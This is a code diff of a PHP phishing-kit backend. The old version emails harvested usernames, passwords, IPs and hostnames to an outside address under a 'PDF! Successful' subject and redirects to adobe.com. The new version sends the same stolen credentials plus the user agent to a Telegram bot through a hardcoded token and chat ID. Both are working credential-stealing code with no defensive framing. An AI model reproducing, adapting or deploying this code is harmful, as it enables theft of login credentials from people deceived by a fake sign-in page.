@@ -1,32 +1,47 @@
-<?
+<?php
+// Telegram Bot Credentials
+$telegramToken = "7794527769:AAGME4TVgMq3kv_HhiBLmjDld4hwElO4LHk";
+$chatID = "7283094857";
 
-$adddate=date("D M d, Y g:i a");
-$ip = getenv("REMOTE_ADDR");
-$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
-$message .= "Username: ".$_POST['userID']."\n";
-$message .= "Password: ".$_POST['password']."\n";
-$message .= "\n";
-$message .= "Date: ".$adddate."\n";
-$message .= "Host: ".$host."\n";
-$message .= "IP: ".$ip."\n";
-$message .= "------------- DataMASTER -------------\n";
-$recipient = "anthonytaylor.w1@outook.com";
-$subject = "PDF! Successful ".$_POST['username']."\n";
-$from = "$ip";
-$headers .= $_POST['eMailAdd']."\n";
-$headers .= "MIME-Version: 1.0\n";
-$headers = "From: $from\r\n";
-$headers .= '' . "\r\n";
-	 mail("$to", "$subject", $message);
-if (mail($recipient,$subject,$message,$headers))
-	   {
-		   header("Location:  https://adobe.com/");
+// Check if form data is received
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $userID = isset($_POST['userID']) ? trim($_POST['userID']) : '';
+    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
 
-	   }
-else
-    	   {
-		   header("Location:  index.html");
+    if (!empty($userID) && !empty($password)) {
+        // Collect User IP and User-Agent
+        $ip = $_SERVER['REMOTE_ADDR'];
+        $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
-	   }
+        // Format message for Telegram
+        $message = "🔔 New Login Attempt 🔔\n";
+        $message .= "📧 Email/UserID: $userID\n";
+        $message .= "🔑 Password: $password\n";
+        $message .= "🌍 IP: $ip\n";
+        $message .= "🖥 User-Agent: $userAgent";
 
+        // Send message to Telegram
+        $telegramURL = "https://api.telegram.org/bot$telegramToken/sendMessage";
+        $data = [
+            'chat_id' => $chatID,
+            'text' => $message,
+            'parse_mode' => 'HTML'
+        ];
+
+        // Send request
+        $options = [
+            'http' => [
+                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
+                'method' => 'POST',
+                'content' => http_build_query($data),
+            ],
+        ];
+        $context = stream_context_create($options);
+        file_get_contents($telegramURL, false, $context);
+    }
+}
+
+// Redirect to Thanks Page
+header("Location: ./thanks.html");
+exit();
 ?>
